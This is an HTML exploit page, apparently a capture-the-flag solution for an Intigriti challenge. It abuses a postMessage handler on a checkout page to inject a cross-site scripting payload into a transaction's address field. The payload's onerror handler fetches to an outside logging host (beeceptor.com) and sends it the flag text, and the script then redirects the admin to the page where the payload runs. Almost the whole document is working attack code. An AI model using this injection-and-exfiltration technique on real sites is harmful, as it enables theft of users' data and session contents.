<!DOCTYPE html>
<html>
<body>
    <script>
        const targetOrigin = "https://challenge-0126.intigriti.io";
        
        // The payload escapes the title attribute and injects an onerror handler
        // It then reads the flag from the banner generated by common.js
        const xssPayload = `"><img src=x onerror="fetch('https://kavil.free.beeceptor.com/log?flag=' + encodeURIComponent(document.getElementById('flagText').innerText))">`;

        // 1. Open the checkout page in a hidden iframe
        const ifr = document.createElement('iframe');
        ifr.src = `${targetOrigin}/checkout.html?currency=BTC&price=1`;
        ifr.style.display = 'none';
        document.body.appendChild(ifr);

        ifr.onload = () => {
            // 2. Send the malicious transaction via postMessage
            ifr.contentWindow.postMessage({
                type: 'submitTransaction',
                transaction: {
                    currency: 'BTC',
                    amount: 0.00001,
                    toAddress: xssPayload
                }
            }, '*');

            // 3. Wait for the API to process, then redirect the Admin to the marketwatch page
            setTimeout(() => {
                window.location.href = `${targetOrigin}/marketwatch.html`;
            }, 1500);
        };
    </script>
</body>
</html>
